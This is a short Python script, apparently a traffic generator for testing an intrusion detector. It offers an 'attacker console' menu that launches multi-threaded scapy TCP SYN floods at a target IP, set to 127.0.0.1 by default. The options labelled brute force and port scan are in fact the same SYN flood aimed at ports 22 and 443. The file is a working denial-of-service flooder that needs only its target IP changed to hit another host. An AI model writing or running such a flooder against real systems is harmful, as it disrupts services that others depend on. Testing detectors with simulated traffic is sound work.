from scapy.all import IP, TCP, send
import time
from threading import Thread

target_ip = "127.0.0.1" 
is_attacking = False

def flood(port):
    global is_attacking
    while is_attacking:
        pkt = IP(dst=target_ip)/TCP(dport=port, flags="S")
        send(pkt, verbose=False)

def launch_attack(type):
    global is_attacking
    port = 80 if type == "dos" else (22 if type == "brute" else 443)
    is_attacking = True
    print(f"🚀 TURBO {type.upper()} ACTIVE... PRESS CTRL+C TO STOP")
    
    # 4 threads to ensure the packet count hits the override threshold (>25)
    for _ in range(4):
        Thread(target=lambda: flood(port)).start()
        
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        is_attacking = False
        print("\n✅ Simulation Terminated.")

if __name__ == "__main__":
    while True:
        print("\n🔥 TURBO ATTACKER CONSOLE")
        print("1: DoS (Port 80) | 2: Brute Force (Port 22) | 3: Port Scan (Port 443) | Q: Quit")
        c = input("Select: ").lower()
        if c == '1': launch_attack("dos")
        elif c == '2': launch_attack("brute")
        elif c == '3': launch_attack("scan")
        elif c == 'q': break